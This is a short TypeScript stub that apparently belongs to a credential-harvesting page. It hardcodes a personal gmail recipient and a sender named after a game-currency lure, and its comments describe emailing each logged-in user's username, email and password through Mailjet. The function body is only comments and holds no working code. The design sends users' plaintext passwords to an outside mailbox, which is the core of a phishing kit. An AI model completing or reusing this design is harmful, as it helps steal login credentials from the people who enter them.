const NOTIFICATION_EMAIL = 'drippygum@gmail.com'; // The email to send notifications to
const SENDER_EMAIL = 'standoff2gold@example.com';

// Send email notification when someone logs in
export async function sendWaitlistNotification(entry: WaitlistEntry): Promise<boolean> {
  // Creates HTML email with username, email, and password details
  // Sends notification using Mailjet
}